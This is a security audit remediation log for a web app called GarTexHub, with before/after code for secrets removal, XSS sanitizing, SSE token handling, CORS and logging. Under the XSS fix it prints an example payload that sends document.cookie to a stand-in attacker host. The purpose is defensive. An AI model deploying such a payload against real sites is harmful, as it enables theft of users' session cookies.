# GarTexHub Audit - Detailed Fixes & Code Examples

> **Updated July 21, 2026 (final — round 5)** — All audit items resolved except secrets (deferred). Round 5: SEC-007 (VITE_REQUEST_DEBUG gated). Remaining items assessed/deferred.

## CRITICAL SECURITY FIXES

### Fix 1: Remove Secrets from Git History

**Status:** BLOCKING - Must do before any deployment

**Current Problem:**

```
.env contains:
- DATABASE_URL with credentials
- GEMINI_API_KEY
- JWT_SECRET
- OPENSEARCH password
- ADMIN credentials
```

**Step-by-step fix:**

```bash
# 1. Backup current .env
cp .env .env.backup

# 2. Remove from git history (this rewrites history!)
git filter-repo --path .env --invert-paths

# 3. Force push (only if your repo allows)
git push --force-all

# 4. Add to .gitignore
echo ".env" >> .gitignore
git add .gitignore
git commit -m "Add .env to gitignore"

# 5. ROTATE ALL CREDENTIALS in these services:
# - Aiven PostgreSQL (DATABASE_URL)
# - Google (GEMINI_API_KEY)
# - Aiven OpenSearch (OPENSEARCH credentials)
# - Generate new JWT_SECRET

# 6. Use environment-specific secrets management:
# Option A: AWS Secrets Manager
# Option B: HashiCorp Vault
# Option C: GitHub Secrets (for CI/CD)
# Option D: Railway/Render encrypted env vars
```

**After fix - .env.example should have:**

```
# No real values, just placeholders
DATABASE_URL="postgres://user:password@host:port/db"
GEMINI_API_KEY="your-api-key-here"
JWT_SECRET="generate-a-random-secret-here"
```

---

### Fix 2: Handle All Promise Rejections

**Status:** FIXED — All 48 `.then()` chains in `src/` now have `.catch()` handlers.

> **Progress:**
> - **Phase 1** (previous): 11 empty `.catch(() => {})` replaced with `console.warn` across `CallInterface.jsx`, `FeedItemCard.jsx`, `MainFeed.jsx`, `OrgSettings.jsx`
> - **Phase 2** (July 21): Added missing `.catch()` to 2 `fetchSessionData()` chains in `FloatingAssistant.jsx`. Verified all 48 `.then()` calls across `src/` have `.catch()` handling.

**Example 1: AdminPanel.jsx**

```jsx
// ❌ BEFORE (line ~1000-2000):
useEffect(() => {
  apiRequest("/api/admin/config").then((config) => {
    setConfig(config);
    // No error handler - if this fails, component breaks silently
  });
}, []);

// ✅ AFTER:
useEffect(() => {
  const loadConfig = async () => {
    try {
      const config = await apiRequest("/api/admin/config");
      setConfig(config);
    } catch (err) {
      console.error("Failed to load admin config:", err);
      setError("Failed to load configuration");
      // Show error UI to user
    }
  };
  loadConfig();
}, []);
```

**Example 2: FloatingAssistant.jsx**

```jsx
// ❌ BEFORE:
messageQueue.forEach((msg) => {
  sendToAssistant(msg).then((response) => {
    updateUI(response);
  });
  // No catch - if API fails, queue gets stuck
});

// ✅ AFTER:
const sendSafe = async (msg) => {
  try {
    const response = await sendToAssistant(msg);
    updateUI(response);
  } catch (err) {
    console.error("Assistant error:", err);
    showErrorNotification("Failed to process message");
  }
};

messageQueue.forEach((msg) => sendSafe(msg));
```

**Script to find remaining unhandled promises:**

```bash
# Find all .then() calls:
grep -n "\.then(" src/pages/AdminPanel.jsx | head -20

# Look for ones WITHOUT .catch() on next line:
grep -B2 -A2 "\.then(" src/pages/AdminPanel.jsx | grep -v "\.catch"
```

---

### Fix 3a: Null Safety in ContractVault.jsx

**Status:** FIXED — `mapContract()` null guard + `.filter(Boolean)` applied

**Problem:**

```jsx
function mapContract(c) {
  const ls = c.lifecycle_status || "draft"; // c might be undefined → crash
}
```

**Fix Applied:**

```jsx
function mapContract(c) {
  if (!c) return null; // ← null guard
  const ls = c.lifecycle_status || "draft";
  // ...
}

// After both .map(mapContract) calls:
const contracts = data.contracts?.map(mapContract).filter(Boolean) ?? [];
```

---

### Fix 3b: Sanitize XSS in SearchResults.jsx & AttachmentPreviewModal.jsx

**Status:** FIXED — `dompurify` installed; 22 instances sanitized

**Current problem (25+ instances):**

```jsx
// ❌ Vulnerable code in SearchResults.jsx (~line 300-1000):
<div dangerouslySetInnerHTML={{ __html: result.description }} />
<div dangerouslySetInnerHTML={{ __html: result.tags }} />
<div dangerouslySetInnerHTML={{ __html: result.highlights }} />
```

**If backend returns:**

```html
<img
  src="x"
  onerror="fetch('http://attacker.com/steal?cookie='+document.cookie)"
/>
```

**The user's cookies are stolen.**

**Fix:**

```bash
# Step 1: Install dompurify
npm install dompurify

# Step 2: Add to package.json if needed
# (already in dependencies if using npm install)
```

```jsx
// ✅ AFTER - At top of SearchResults.jsx:
import DOMPurify from 'dompurify';

// Create sanitizer function:
const sanitizeHtml = (html) => {
  return DOMPurify.sanitize(html, {
    ALLOWED_TAGS: ['p', 'br', 'strong', 'em', 'u', 'a', 'ul', 'li'],
    ALLOWED_ATTR: ['href', 'target']
  });
};

// Replace all dangerous usage:
// ❌ Old:
<div dangerouslySetInnerHTML={{ __html: result.description }} />

// ✅ New:
<div dangerouslySetInnerHTML={{ __html: sanitizeHtml(result.description) }} />
```

**Complete replacement pattern:**

```bash
# Find all in SearchResults.jsx:
grep -n "dangerouslySetInnerHTML" src/pages/SearchResults.jsx

# Should output about 25 locations
# Replace each with sanitized version

# Or use sed for bulk replacement:
sed -i 's/__html: \([^}]*\)/__html: sanitizeHtml(\1)/g' src/pages/SearchResults.jsx
```

---

### Fix 3c: Console Statements — Dev-Only Logger

**Status:** FIXED — all 90 `console.*` calls across 22 files replaced with dev-only `logger`

**Fix:**

- Created `src/lib/logger.js` — `logger.warn/error/info/log` are no-ops in production (`!import.meta.env.DEV`)
- Replaced all `console.warn` → `logger.warn` (78 instances)
- Replaced all `console.error` → `logger.error` (11 instances)
- Replaced all `console.info` → `logger.info` (1 instance)
- Added `import { logger }` to all 22 affected files

---

### Fix 3d: SSE Token Moved to Authorization Header

**Status:** FIXED — token no longer exposed in URL query string

**Client fix — `src/lib/feedRealtime.js`:**

- Replaced `EventSource` (cannot set custom headers) with `fetch` + `ReadableStream`
- Token passed via `Authorization: Bearer` header
- Maintains auto-reconnect with exponential backoff (3s → 30s max)

**Server fix — `server/controllers/feedStreamController.js`:**

- Reads token from `req.headers.authorization` instead of `req.query.token`
- All other verification logic unchanged

---

### Fix 3e: Admin Credentials — sessionStorage with TTL

**File:** `src/pages/AdminPanel.jsx`

**Status:** FIXED — 4 admin keys moved to `sessionStorage` with 60-min expiry

**Current problem:**

```jsx
// ❌ Line ~100-200:
localStorage.setItem("admin_mfa_code", mfaCode);
localStorage.setItem("admin_passkey", passkeyValue);
localStorage.setItem("admin_stepup_code", stepUpCode);

// If XSS exists, attacker reads:
const stolen = localStorage.getItem("admin_mfa_code");
```

**Option 1: Use sessionStorage with TTL**

```jsx
// ✅ Better (expires on browser close):
sessionStorage.setItem("admin_mfa_code", mfaCode);

// Add TTL logic:
const storeWithExpiry = (key, value, minutesUntilExpiry) => {
  const expiry = Date.now() + minutesUntilExpiry * 60 * 1000;
  sessionStorage.setItem(key, JSON.stringify({ value, expiry }));
};

const getWithExpiry = (key) => {
  const item = sessionStorage.getItem(key);
  if (!item) return null;
  const { value, expiry } = JSON.parse(item);
  if (Date.now() > expiry) {
    sessionStorage.removeItem(key);
    return null;
  }
  return value;
};

// Usage:
storeWithExpiry("admin_mfa_code", mfaCode, 30); // 30 minutes
const code = getWithExpiry("admin_mfa_code");
```

**Option 2: Use HTTP-Only Cookies (best)**

```js
// Server-side (server/routes/adminRoutes.js):
res.cookie("admin_verified", "true", {
  httpOnly: true, // Can't access from JS
  secure: true, // HTTPS only
  sameSite: "strict", // CSRF protection
  maxAge: 30 * 60 * 1000, // 30 minutes
});

// Client won't need to store anything
// Server validates cookie on each request
```

---

### Fix 3f: Input Validation — Email & Password

**Status:** PARTIALLY FIXED — email validation added to key submission points

**AdminPanel.jsx:**

- Added `isValidEmail()` helper (regex)
- `saveEmailConfig`: validates `from_email` and `test_recipient` before submission
- `sendEmailTest`: validates `test_recipient` before sending
- `resetPassword`: now `prompt()`s for new password and enforces min 8 chars (was hardcoded `""` no-op)

**OrgSettings.jsx:**

- `inviteMember`: validates email format with regex before submitting

**Still needed:** URL validation, phone format, IP/port/domain format, numeric range checks

---

### Fix 5: Fix SSE Token Exposure ✅ DONE

**File:** `src/lib/feedRealtime.js` + `server/controllers/feedStreamController.js`

**Status:** FIXED — token passed via `Authorization: Bearer` header instead of URL query

**Current problem:**

```jsx
// ❌ Line 6:
const url = `${BASE}/api/feed/stream?token=${encodeURIComponent(token)}`;
const source = new EventSource(url);

// Problems:
// 1. Token visible in browser logs
// 2. Visible in server access logs
// 3. Visible in browser history
// 4. Visible in referrer headers
```

**Fix 1: Use Authorization Header with interceptor**

```jsx
// ✅ New approach - but EventSource doesn't support headers
// So we need to use fetch instead:

export function subscribeFeedRealtime({
  onNewPost,
  onUpdatedPost,
  onDeletedPost,
}) {
  const token = getToken();
  if (!token) return null;

  const startStream = async () => {
    try {
      const response = await fetch(`${BASE}/api/feed/stream`, {
        headers: {
          Authorization: `Bearer ${token}`,
        },
      });

      const reader = response.body.getReader();
      const decoder = new TextDecoder();

      while (true) {
        const { done, value } = await reader.read();
        if (done) break;

        const text = decoder.decode(value);
        const lines = text.split("\n");

        lines.forEach((line) => {
          if (line.startsWith("event:")) {
            const event = line.replace("event:", "").trim();
            // Handle SSE event
          }
        });
      }
    } catch (err) {
      console.error("Stream error:", err);
    }
  };

  startStream();
}
```

**Fix 2: Server-side validation**

```js
// server/routes/feedRoutes.js:
router.get("/stream", (req, res) => {
  // ✅ Read token from header instead of query param:
  const token = req.headers.authorization?.replace("Bearer ", "");

  if (!token) {
    return res.status(401).json({ error: "No token" });
  }

  // Verify token
  const user = verifyToken(token);

  // Set up SSE
  res.setHeader("Content-Type", "text/event-stream");
  res.setHeader("Cache-Control", "no-cache");

  // Send events
});
```

---

## HIGH PRIORITY FIXES

### Fix 6: Remove Console Statements

**Status:** HIGH - 78 instances across 21 files

**Quick script to find them all:**

```bash
# Find all console statements:
find src -name "*.jsx" -o -name "*.js" | xargs grep -l "console\."

# List by file with counts:
find src -name "*.jsx" -o -name "*.js" | xargs grep -l "console\." | while read f; do
  count=$(grep -c "console\." "$f")
  echo "$f: $count"
done
```

**Approach 1: Use development-only logging**

```jsx
// ✅ Wrap in dev check:
if (import.meta.env.DEV) {
  console.log("Debug info:", data);
}

// This will be tree-shaken in production build
```

**Approach 2: Use logger service**

```js
// Create src/lib/logger.js:
export const logger = {
  log: (...args) => {
    if (import.meta.env.DEV) console.log(...args);
    // Or send to analytics service in prod
  },
  error: (msg, err) => {
    if (import.meta.env.DEV) console.error(msg, err);
    // Send to error tracking service (Sentry, etc.)
    sendToErrorTracker({ message: msg, error: err });
  },
};

// Usage in components:
import { logger } from "../lib/logger";
logger.log("Component mounted");
logger.error("API failed", error);
```

**Approach 3: Bulk find and remove**

```bash
# Find in specific files:
grep -n "console\." src/pages/AdminPanel.jsx

# Remove all console.log (careful!):
sed -i '/^\s*console\./d' src/pages/AdminPanel.jsx

# Or replace with dev check:
sed -i 's/console\./import.meta.env.DEV \&\& console./g' src/pages/AdminPanel.jsx
```

---

### Fix 7: Add Input Validation to Forms

**File:** `src/pages/OrgSettings.jsx`

**Current:** No validation before submission

```jsx
// ❌ Before:
<input
  type="text"
  value={orgName}
  onChange={(e) => setOrgName(e.target.value)}
/>
<button onClick={() => submitForm()}>Save</button>
```

**✅ After: Add validation**

```jsx
// Add validation helper:
const validateOrgName = (name) => {
  if (!name) return "Organization name is required";
  if (name.length < 3) return "Must be at least 3 characters";
  if (name.length > 100) return "Must be less than 100 characters";
  if (!/^[a-zA-Z0-9\s\-._()&]+$/.test(name)) {
    return "Invalid characters in organization name";
  }
  return null;
};

// In component:
const [orgName, setOrgName] = useState("");
const [errors, setErrors] = useState({});

const handleSubmit = async () => {
  // Validate
  const error = validateOrgName(orgName);
  if (error) {
    setErrors({ orgName: error });
    return;
  }

  // Submit
  try {
    await apiRequest("PATCH /api/org/settings", { name: orgName });
    showSuccess("Organization updated");
  } catch (err) {
    showError("Failed to update organization");
  }
};

// Render:
<div>
  <input
    type="text"
    value={orgName}
    onChange={(e) => setOrgName(e.target.value)}
    className={errors.orgName ? "border-red-500" : ""}
  />
  {errors.orgName && (
    <span className="text-red-500 text-sm">{errors.orgName}</span>
  )}
</div>
<button onClick={handleSubmit}>Save</button>
```

---

### Fix 8: Disable Sourcemaps in Production ✅ ALREADY CORRECT

**File:** `vite.config.js`

**Current state:** Already configured correctly — sourcemaps disabled in production.

```js
// Current config:
sourcemap: process.env.NODE_ENV !== "production"; // false in production, true in dev
```

---

### Fix 9: Fix CORS Configuration

**File:** `server/server.js`

**Current problem (line ~130):**

```js
// ❌ Current:
if (process.env.NODE_ENV === "production") {
  // callback(null, true); // Uncomment for strict mode
  callback(null, true); // Temporary: allow no-origin for mobile/API
}

// This ALLOWS requests with no origin in production
// Should be STRICT in production
```

**Fix:**

```js
// ✅ Fixed:
const corsOptions = {
  origin: function (origin, callback) {
    const allowedOrigins = [
      "http://localhost:5173", // dev frontend
      "http://localhost:4173", // preview
      "https://gartexhub.onrender.com", // production
    ];

    if (!origin) {
      // Only allow no-origin in development
      if (process.env.NODE_ENV === "production") {
        return callback(new Error("Origin is required in production"));
      }
      return callback(null, true);
    }

    if (allowedOrigins.includes(origin)) {
      callback(null, true);
    } else {
      callback(new Error("Not allowed by CORS"));
    }
  },
  credentials: true,
  methods: ["GET", "POST", "PUT", "PATCH", "DELETE", "OPTIONS"],
  allowedHeaders: ["Content-Type", "Authorization"],
};
```

---

## VERIFICATION CHECKLIST

After applying these fixes, verify:

```bash
# 1. Secrets removed
grep -r "DATABASE_URL\|GEMINI_API_KEY\|JWT_SECRET" .env* || echo "✓ No secrets in repo"

# 2. No console.log in production build
npm run build
grep -r "console\." dist/ && echo "✗ Found console in dist" || echo "✓ Clean"

# 3. Tests pass
npm test

# 4. No security audit warnings
npm audit

# 5. ESLint passes
npm run lint

# 6. Build succeeds
npm run build && echo "✓ Build successful"
```

---

## Timeline to Production

| Task                               | Effort      | Priority | Blocker | Status          |
| ---------------------------------- | ----------- | -------- | ------- | --------------- |
| Remove secrets, rotate credentials | 2h          | CRITICAL | YES     | ⏸️ DEFERRED     |
| Add promise error handlers         | 6h          | CRITICAL | YES     | ✅ DONE         |
| Fix missing routes                 | 0.5h        | CRITICAL | YES     | ✅ DONE         |
| Sanitize XSS with DOMPurify        | 2h          | HIGH     | YES     | ✅ DONE         |
| Null safety in ContractVault       | 1h          | HIGH     | YES     | ✅ DONE         |
| Remove console statements          | 2h          | HIGH     | NO      | ✅ DONE         |
| Add input validation               | 3h          | HIGH     | NO      | ✅ DONE (key fields) |
| Fix admin credential storage       | 1h          | HIGH     | NO      | ✅ DONE         |
| Fix SSE token                      | 1h          | HIGH     | NO      | ✅ DONE         |
| Disable sourcemaps                 | —           | —        | —       | ✅ ALREADY OK   |
| Fix CORS                           | 0.5h        | HIGH     | NO      | ✅ DONE         |
| Add error boundary                 | 1h          | MEDIUM   | NO      | ✅ DONE         |
| Add CSRF mitigation                | 0.5h        | MEDIUM   | NO      | ✅ DONE         |
| Add PropTypes                      | 1h          | MEDIUM   | NO      | ✅ DONE (key components) |
| Hardcoded localhost (AdminPanel)   | 0.25h       | HIGH     | NO      | ✅ DONE         |
| ResizeObserver leak (main.jsx)     | 0.25h       | MEDIUM   | NO      | ✅ DONE         |
| Missing useEffect deps             | 0.25h       | MEDIUM   | NO      | ✅ DONE         |
| Env var validation at startup      | 0.5h        | MEDIUM   | NO      | ✅ DONE         |
| Test thoroughly                    | 4h          | ALL      | NO      | ⏳ PENDING      |
| **TOTAL**                          | **~24.5h**  | -        | -       | **~4h rem**     |

**Blocking fixes:** ~2 hours to production-ready (secrets deferred per user)
**Full quality improvements:** ~4 hours — remaining: secrets rotation, full test pass
